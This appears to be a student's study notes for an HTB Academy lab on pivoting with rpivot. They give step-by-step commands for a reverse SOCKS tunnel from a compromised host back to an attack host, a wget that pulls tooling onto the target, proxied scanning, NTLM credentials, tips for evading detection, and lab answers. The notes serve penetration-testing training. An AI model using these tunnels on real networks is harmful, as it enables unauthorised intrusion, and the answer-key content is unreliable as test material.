# **Rpivot Web Server Pivoting - HTB Academy Page 10**

## **📋 Module Overview**

**Purpose:** Reverse SOCKS proxy for web server pivoting  
**Tool:** Rpivot - Python-based reverse SOCKS proxy  
**Mechanism:** Client connects back to server (reverse connection)  
**Use Case:** Access internal web servers through compromised hosts  
**Special Feature:** NTLM authentication support for corporate proxies  

---

## **1. Introduction to Rpivot**

### **What is Rpivot?**
- **Type:** Reverse SOCKS proxy tool
- **Language:** Python (requires Python 2.7)
- **Architecture:** Client-server model
- **Direction:** Client connects TO server (reverse)
- **Purpose:** SOCKS tunneling through compromised internal hosts

### **Rpivot vs Traditional SOCKS**

| **Aspect** | **Traditional SOCKS** | **Rpivot** |
|------------|----------------------|------------|
| **Connection Direction** | Server waits, client connects | Client connects back to server |
| **Firewall Bypass** | May be blocked inbound | Better (outbound connections) |
| **Setup Location** | SOCKS server on pivot | Server on attack host |
| **Use Case** | Direct network access | Compromised internal hosts |
| **Authentication** | Basic SOCKS auth | NTLM proxy support |

### **Network Topology**
```
[Attack Host] ← [Ubuntu Pivot] ← [Internal Webserver]
10.10.14.18     10.129.15.50        172.16.5.135:80
rpivot server   rpivot client       Target web service
:9999 control   connects back       Internal network
:9050 SOCKS
```

### **Key Components**
1. **server.py** - runs on attack host (external)
2. **client.py** - runs on pivot host (internal)
3. **SOCKS proxy** - created on attack host for tools
4. **proxychains** - routes traffic through SOCKS proxy

---

## **2. Installation and Setup**

### **Installing Rpivot**

#### **Clone Repository**
```bash
# Download rpivot from GitHub
git clone https://github.com/klsecservices/rpivot.git
cd rpivot

# Verify contents
ls -la
# client.py  server.py  README.md
```

#### **Python 2.7 Dependency**
```bash
# Method 1: System package manager
sudo apt-get update
sudo apt-get install python2.7

# Verify installation
python2.7 --version
# Python 2.7.18
```

#### **Alternative Python 2.7 Installation**
```bash
# Method 2: Using pyenv (if system package unavailable)
curl https://pyenv.run | bash

# Add to bashrc
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc

# Reload environment
source ~/.bashrc

# Install Python 2.7
pyenv install 2.7
pyenv shell 2.7

# Verify
python --version
# Python 2.7.18
```

### **Verification**
```bash
# Test rpivot components
python2.7 server.py --help
python2.7 client.py --help
```

---

## **3. Basic Rpivot Usage**

### **Step 1: Start Rpivot Server (Attack Host)**

```bash
# Run server.py on attack host
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Expected output:
Starting server on 0.0.0.0:9999
Proxy listening on 127.0.0.1:9050
Waiting for connections...
```

**Server Configuration:**
- **--proxy-port 9050**: SOCKS proxy port for tools
- **--server-port 9999**: Control port for client connections
- **--server-ip 0.0.0.0**: Listen on all interfaces

### **Step 2: Transfer Rpivot to Target**

```bash
# Transfer rpivot directory to pivot host
scp -r rpivot ubuntu@<target_ip>:/home/ubuntu/

# Example:
scp -r rpivot ubuntu@10.129.202.64:/home/ubuntu/

# Expected output:
client.py    100% 1234   1.2KB/s   00:01
server.py    100% 2345   2.3KB/s   00:01
README.md    100%  567   0.6KB/s   00:01
```

### **Step 3: Run Rpivot Client (Pivot Host)**

```bash
# SSH to pivot host
ssh ubuntu@10.129.202.64

# Navigate to rpivot directory
cd ~/rpivot

# Run client.py to connect back to attack host
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# Expected output:
Backconnecting to server 10.10.14.18 port 9999
Connected to server
```

### **Step 4: Confirm Connection (Attack Host)**

```bash
# On attack host, server.py should show:
New connection from host 10.129.202.64, source port 35226
Client connected successfully
```

---

## **4. Accessing Internal Web Servers**

### **Configure Proxychains**

```bash
# Edit proxychains configuration
sudo nano /etc/proxychains.conf

# Add at the end (comment out other entries):
[ProxyList]
socks4 127.0.0.1 9050
```

### **Web Server Access Methods**

#### **Method 1: Firefox with Proxychains**
```bash
# Launch Firefox through proxychains
proxychains firefox-esr 172.16.5.135:80

# Expected result: Apache2 Ubuntu Default Page
```

#### **Method 2: Curl with Proxychains**
```bash
# Web content retrieval
proxychains curl http://172.16.5.135

# Expected output:
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.135:80  ...  OK
<!DOCTYPE html>
<html>
<head>
    <title>Welcome to Apache2 Ubuntu Default Page</title>
</head>
...
```

#### **Method 3: Nmap Scanning**
```bash
# Port scanning through proxy
proxychains nmap -sT -Pn 172.16.5.135

# Service enumeration
proxychains nmap -sV -p 80,443,8080 172.16.5.135
```

---

## **5. Advanced Rpivot Features**

### **NTLM Authentication Support**

**Scenario:** Corporate environment with NTLM proxy

```bash
# Client with NTLM authentication
python2.7 client.py \
    --server-ip <target_webserver_ip> \
    --server-port 8080 \
    --ntlm-proxy-ip <proxy_server_ip> \
    --ntlm-proxy-port 8081 \
    --domain <windows_domain> \
    --username <domain_user> \
    --password <user_password>

# Example:
python2.7 client.py \
    --server-ip 10.10.14.18 \
    --server-port 9999 \
    --ntlm-proxy-ip 172.16.5.1 \
    --ntlm-proxy-port 8080 \
    --domain INLANEFREIGHT \
    --username jdoe \
    --password Password123!
```

### **Custom Port Configuration**

```bash
# Server with custom ports
python2.7 server.py --proxy-port 8050 --server-port 8999 --server-ip 0.0.0.0

# Client connecting to custom ports
python2.7 client.py --server-ip 10.10.14.18 --server-port 8999
```

### **Multiple Client Support**

```bash
# Server supports multiple clients
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Multiple clients can connect:
# Client 1 from host A
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# Client 2 from host B  
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

---

## **6. HTB Academy Lab Exercises**

### **Lab Question 1: Server Location**
**"From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host?"**

**Answer:** `Attack Host`

**Explanation:**
- **server.py** runs on the **attack host** (external)
- Creates SOCKS proxy for tools to use
- Listens for incoming connections from clients
- Provides external access point for internal clients

**Technical Reasoning:**
```bash
# Attack Host (10.10.14.18):
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
# Creates:
# - Control listener on :9999 for clients
# - SOCKS proxy on :9050 for tools
```

### **Lab Question 2: Client Location**
**"From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host?"**

**Answer:** `Pivot Host`

**Explanation:**
- **client.py** runs on the **pivot host** (internal)
- Connects back to server on attack host
- Provides access to internal network resources
- Acts as bridge between internal and external networks

**Technical Reasoning:**
```bash
# Pivot Host (10.129.202.64):
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
# Creates:
# - Outbound connection to attack host
# - Bridge to internal network (172.16.5.0/23)
```

### **Lab Question 3: Web Server Flag**
**"Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer."**

#### **Complete Solution Steps**

**Step 1: Setup Rpivot Server**
```bash
# On attack host (Pwnbox)
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

**Step 2: Transfer and Run Client**
```bash
# Transfer to pivot host
scp -r rpivot ubuntu@<pivot_ip>:/home/ubuntu/

# SSH to pivot host
ssh ubuntu@<pivot_ip>

# Run client
cd ~/rpivot
python2.7 client.py --server-ip <attack_host_ip> --server-port 9999
```

**Step 3: Configure Proxychains**
```bash
# Edit proxychains config
sudo nano /etc/proxychains.conf

# Add:
[ProxyList]
socks4 127.0.0.1 9050
```

**Step 4: Access Web Server**
```bash
# Method 1: Curl for flag
proxychains curl http://172.16.5.135

# Method 2: Firefox GUI
proxychains firefox-esr 172.16.5.135

# Look for flag in format: HTB{...} or similar
```

**Answer:** `[Flag will be displayed on the web page]`

---

## **7. Troubleshooting Rpivot**

### **Common Issues**

#### **Python 2.7 Not Available**
```bash
# Problem: python2.7 command not found
bash: python2.7: command not found

# Solutions:
1. Install system package
   sudo apt-get install python2.7

2. Use pyenv installation
   pyenv install 2.7 && pyenv shell 2.7

3. Create symlink (if python2 exists)
   sudo ln -s /usr/bin/python2 /usr/bin/python2.7
```

#### **Server Connection Refused**
```bash
# Problem: Client cannot connect to server
Connection refused to 10.10.14.18:9999

# Solutions:
1. Verify server is running
   ps aux | grep server.py

2. Check firewall rules
   sudo ufw status
   sudo ufw allow 9999

3. Test connectivity
   nc -v 10.10.14.18 9999
```

#### **SOCKS Proxy Not Working**
```bash
# Problem: Proxychains cannot connect
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  FAILED

# Solutions:
1. Verify server SOCKS port
   netstat -tlnp | grep :9050

2. Check proxychains config
   cat /etc/proxychains.conf | grep -A 5 ProxyList

3. Test SOCKS proxy
   curl --socks4 127.0.0.1:9050 http://172.16.5.135
```

#### **File Transfer Issues**
```bash
# Problem: SCP transfer fails
Permission denied (publickey,password)

# Solutions:
1. Test SSH connection first
   ssh ubuntu@target_ip

2. Use correct credentials
   ssh ubuntu@target_ip
   # Password: HTB_@cademy_stdnt!

3. Alternative transfer methods
   # HTTP server on attack host
   python3 -m http.server 8000
   # Download on target
   wget http://attack_ip:8000/rpivot.tar.gz
```

---

## **8. Operational Considerations**

### **Advantages of Rpivot**
1. **Reverse connection** - bypasses inbound firewall restrictions
2. **NTLM support** - works with corporate proxy authentication
3. **Multiple clients** - supports multiple pivot points
4. **Python-based** - cross-platform compatibility
5. **Simple setup** - minimal configuration required

### **Limitations**
1. **Python 2.7 dependency** - legacy Python version
2. **Performance** - Python overhead compared to compiled tools
3. **Detection** - clear process names and network patterns
4. **Maintenance** - Python 2.7 EOL and security concerns
5. **Limited protocols** - SOCKS4 only (no SOCKS5 features)

### **Security Considerations**
1. **Process visibility** - python processes visible in ps
2. **Network signatures** - predictable traffic patterns
3. **Log traces** - SSH transfers and connections logged
4. **Python 2.7 vulnerabilities** - known security issues
5. **Clear text configuration** - command line arguments visible

---

## **9. Alternative Tools Comparison**

### **Rpivot vs Other Pivoting Tools**

| **Tool** | **Language** | **Direction** | **Auth Support** | **Performance** |
|----------|--------------|---------------|------------------|-----------------|
| **Rpivot** | Python 2.7 | Reverse | NTLM | Medium |
| **sshuttle** | Python 3 | Forward | SSH keys | High |
| **Chisel** | Go | Both | None | High |
| **ligolo-ng** | Go | Reverse | TLS | High |
| **SSH** | C | Forward | Keys/password | High |

### **When to Use Rpivot**
✅ **Corporate environments** with NTLM proxies  
✅ **Reverse connections** needed for firewall bypass  
✅ **Multiple pivot points** required  
✅ **Python available** on target systems  
✅ **SOCKS tunneling** sufficient for needs  

### **When NOT to Use Rpivot**
❌ **Python 2.7 unavailable** on targets  
❌ **High performance** requirements  
❌ **Stealth operations** (process detection risk)  
❌ **Modern protocols** needed (HTTP/3, etc.)  
❌ **Long-term persistence** (maintenance overhead)  

---

## **10. Integration Examples**

### **Web Application Testing**
```bash
# Burp Suite through Rpivot
proxychains burpsuite

# Configure Burp proxy settings:
# Proxy: 127.0.0.1:8080
# Upstream proxy: 127.0.0.1:9050 (SOCKS4)
```

### **Database Access**
```bash
# MySQL connection through tunnel
proxychains mysql -h 172.16.5.135 -u admin -p

# PostgreSQL access
proxychains psql -h 172.16.5.135 -U postgres -d database
```

### **File Share Access**
```bash
# SMB enumeration
proxychains smbclient -L //172.16.5.135

# NFS mounting
proxychains showmount -e 172.16.5.135
```

---

## **11. Monitoring and Logging**

### **Server-Side Monitoring**
```bash
# Monitor rpivot server connections
tail -f server.log

# Check SOCKS proxy usage
netstat -an | grep :9050

# Monitor client connections
lsof -i :9999
```

### **Client-Side Monitoring**
```bash
# Monitor client connection status
ps aux | grep client.py

# Check network connections
netstat -an | grep 9999

# Monitor resource usage
top -p $(pgrep python2.7)
```

### **Traffic Analysis**
```bash
# Capture rpivot traffic
tcpdump -i any port 9999 or port 9050

# Analyze SOCKS traffic
wireshark -f "port 9050"
```

---

## **12. Best Practices**

### **Operational Guidelines**
1. **Pre-stage Python 2.7** - ensure availability before engagement
2. **Test connectivity** - verify network paths before deployment
3. **Use non-standard ports** - avoid default port detection
4. **Monitor connections** - track client status and performance
5. **Clean up processes** - terminate sessions properly

### **Security Recommendations**
1. **Encrypt transfers** - use SSH/HTTPS for rpivot deployment
2. **Rotate ports** - change default ports for each engagement
3. **Limit exposure time** - minimize active tunnel duration
4. **Clear artifacts** - remove rpivot files after use
5. **Monitor logs** - watch for detection indicators

### **Performance Optimization**
1. **Single-purpose clients** - dedicate clients to specific tasks
2. **Batch operations** - minimize interactive session overhead
3. **Compress transfers** - use efficient data transfer methods
4. **Monitor bandwidth** - track and limit usage patterns
5. **Connection pooling** - reuse established tunnels

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 10
- **Rpivot GitHub**: [Official Repository](https://github.com/klsecservices/rpivot)
- **Python 2.7 Documentation**: [Legacy Python Docs](https://docs.python.org/2.7/)
- **SOCKS Protocol**: [RFC 1928 - SOCKS Version 5](https://tools.ietf.org/html/rfc1928)
- **NTLM Authentication**: [Microsoft NTLM Documentation](https://docs.microsoft.com/en-us/windows/security/) 